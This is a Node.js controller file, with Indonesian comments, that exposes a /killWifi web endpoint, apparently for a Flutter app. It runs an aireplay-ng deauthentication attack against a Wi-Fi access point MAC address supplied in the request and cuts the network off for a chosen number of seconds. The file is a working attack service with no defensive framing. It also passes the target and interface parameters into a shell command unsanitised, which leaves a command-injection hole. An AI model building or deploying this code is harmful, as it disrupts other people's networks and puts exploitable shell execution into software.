const { exec } = require('child_process');
const { logger } = require('../utils/logger');
const { activeKeys } = require('../middleware/authMiddleware');

class NetworkController {
  
  /**
   * Validasi integritas Session Key dari memori sistem
   */
  static validateSession(key) {
    if (!key) return { valid: false, message: "Missing session key." };
    const keyInfo = activeKeys[key];
    if (!keyInfo) return { valid: false, message: "Key invalid or expired." };
    return { valid: true, keyInfo };
  }

  /**
   * Endpoint Utama: /killWifi
   * URL Format: http://host:port/killWifi?key=xxx&target=mac&interface=wlan0mon
   */
  static async killWifi(req, res) {
    const key = req.query.key;
    const target = req.query.target;
    const duration = req.query.duration;
    const iface = req.query.interface || 'wlan0mon';

    // 1. Audit Akses
    const auth = NetworkController.validateSession(key);
    if (!auth.valid) {
      return res.status(403).json({ 
        success: false, 
        message: auth.message 
      });
    }

    // 2. Audit Parameter Target
    if (!target) {
      return res.status(400).json({ 
        success: false, 
        message: "Target hardware address (MAC) is required." 
      });
    }

    const attacker = auth.keyInfo.username;
    const attackDuration = duration || 60;

    // 3. Low-Level Command Construction
    // -0 (Deauth), 0 (Continuous/Loop), -a (Access Point MAC)
    const command = `aireplay-ng -0 0 -a ${target} ${iface}`;

    logger.info(`[KERNEL_EXEC] Attack initiated by: ${attacker} | Target: ${target} | Interface: ${iface}`);

    // 4. Execution & Automated Termination
    // Menggunakan exec untuk menjalankan perintah shell
    const attackProcess = exec(command, (error, stdout, stderr) => {
      if (error) {
        logger.error(`[KERNEL_ERROR] ${error.message}`);
      }
    });

    // Simulasi pertahanan otomatis: Matikan proses setelah durasi habis
    setTimeout(() => {
      attackProcess.kill();
      logger.info(`[KERNEL_STOP] Attack on ${target} terminated after ${attackDuration}s`);
    }, attackDuration * 1000);

    // 5. Response ke APK Flutter
    return res.status(200).json({
      success: true,
      message: "✅ Attack dispatched",
      session: attacker,
      details: `Target ${target} will be disconnected for ${attackDuration} seconds.`
    });
  }
}

module.exports = NetworkController;
